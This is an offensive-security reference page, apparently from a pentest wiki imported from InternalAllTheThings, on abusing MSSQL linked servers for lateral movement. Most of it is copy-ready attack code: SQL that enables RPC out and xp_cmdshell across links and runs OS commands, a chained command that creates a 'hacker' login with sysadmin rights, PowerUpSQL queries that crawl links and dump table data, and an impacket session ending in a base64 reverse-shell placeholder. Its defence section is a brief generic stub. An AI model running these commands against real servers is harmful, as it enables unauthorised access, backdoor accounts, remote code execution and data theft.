---
title: MSSQL - Linked Database
type: technique
tags: [database, lateral-movement, mssql, reference-import, windows]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-14
sources: [InternalAllTheThings, hacktricks-network]
---

# MSSQL - Linked Database

## What it is

Technical reference for **MSSQL - Linked Database** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

MSSQL linked servers allow one SQL Server instance to execute queries on another instance, using the credentials configured for the link (often a high-privilege account). An attacker with access to one SQL Server instance enumerates linked servers via `master..sysservers` and executes queries or stored procedures on linked instances using `OPENQUERY` or `EXECUTE AT`, potentially escalating from a low-privilege instance to a `sysadmin` account on a linked instance. This creates a lateral movement chain through the SQL Server topology where each link may execute with different and potentially higher privileges.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Summary

- [Find Trusted Link](#find-trusted-link)
- [Execute Query Through The Link](#execute-query-through-the-link)
- [Crawl Links for Instances in the Domain](#crawl-links-for-instances-in-the-domain)
- [Crawl Links for a Specific Instance](#crawl-links-for-a-specific-instance)
- [Query Version of Linked Database](#query-version-of-linked-database)
- [Execute Procedure on Linked Database](#execute-procedure-on-linked-database)
- [Determine Names of Linked Databases](#determine-names-of-linked-databases)
- [Determine All the Tables Names from a Selected Linked Database](#determine-all-the-tables-names-from-a-selected-linked-database)
- [Gather the Top 5 Columns from a Selected Linked Table](#gather-the-top-5-columns-from-a-selected-linked-table)
- [Gather Entries from a Selected Linked Column](#gather-entries-from-a-selected-linked-column)

## Find Trusted Link

```sql
select * from master..sysservers
```

## Execute Query Through The Link

```sql
-- execute query through the link
select * from openquery("dcorp-sql1", 'select * from master..sysservers')
select version from openquery("linkedserver", 'select @@version as version');

-- chain multiple openquery
select version from openquery("link1",'select version from openquery("link2","select @@version as version")')

-- enable rpc out for xp_cmdshell
EXEC sp_serveroption 'sqllinked-hostname', 'rpc', 'true';
EXEC sp_serveroption 'sqllinked-hostname', 'rpc out', 'true';
select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc'',''true'';');
select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc out'',''true'';');

-- execute shell commands
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

-- create user and give admin privileges
EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
```

## Crawl Links for Instances in the Domain

A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results

```ps1
Get-SQLInstanceDomain | Get-SQLServerLink -Verbose
select * from master..sysservers
```

## Crawl Links for a Specific Instance

```ps1
Get-SQLServerLinkCrawl -Instance "<DBSERVERNAME\DBInstance>" -Verbose
select * from openquery("<instance>",'select * from openquery("<instance2>",''select * from master..sysservers'')')
```

## Query Version of Linked Database

```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DBSERVERNAME\DBInstance>`",'select @@version')" -Verbose
```

## Execute Procedure on Linked Database

```ps1
SQL> EXECUTE('EXEC sp_configure ''show advanced options'',1') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at "linked.database.local";
SQL> EXECUTE('RECONFIGURE') at "linked.database.local";
SQL> EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
```

## Determine Names of Linked Databases

> tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query.

```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select name from sys.databases')" -Verbose
```

## Determine All the Tables Names from a Selected Linked Database

> The result is TableName which feeds into following query

```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select name from <DatabaseNameFromPreviousCommand>.sys.tables')" -Verbose
```

## Gather the Top 5 Columns from a Selected Linked Table

> The results are ColumnName and ColumnValue which feed into following query

```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`",'select TOP 5 * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand>')" -Verbose
```

## Gather Entries from a Selected Linked Column

```ps1
Get-SQLQuery -Instance "<DBSERVERNAME\DBInstance>" -Query "select * from openquery(`"<DatabaseLinkName>`"'select * from <DatabaseNameFromPreviousCommand>.dbo.<TableNameFromPreviousCommand> where <ColumnNameFromPreviousCommand>=<ColumnValueFromPreviousCommand>')" -Verbose
```

## MSSQL linked-server credential mapping to cross-forest sysadmin RCE

Linked servers can be defined with a non-self login mapping (Local Login maps to a
fixed Remote Login), so a low-priv login on the near server runs queries on the remote
instance AS the mapped principal. This crosses domain and forest trust boundaries. If
the mapped remote login is sysadmin, the link becomes a remote RCE primitive:
reconfigure the far end and execute OS commands as its SQL service account. Enumerating
the login mappings is the step beyond plain openquery.

```sql
-- Enumerate links and their login mappings (the key recon step)
EXEC sp_linkedservers;
EXEC sp_helplinkedsrvlogin '<LINK_NAME>';

-- Who do you become on the far side, and is it sysadmin?
EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [<LINK_NAME>];

-- If sysadmin remotely: enable xp_cmdshell over the link and run commands
EXEC ('sp_configure ''show advanced options'',1; RECONFIGURE;') AT [<LINK_NAME>];
EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [<LINK_NAME>];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [<LINK_NAME>];
```

```bash
# Same workflow driven by impacket
impacket-mssqlclient -windows-auth <DOMAIN>/<USER>:<PASS>@<SQLHOST>
# SQL> enum_links
# SQL> use_link [<LINK_NAME>]
# SQL> enable_xp_cmdshell
# SQL> xp_cmdshell powershell -e <BASE64_REVSHELL>
```

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
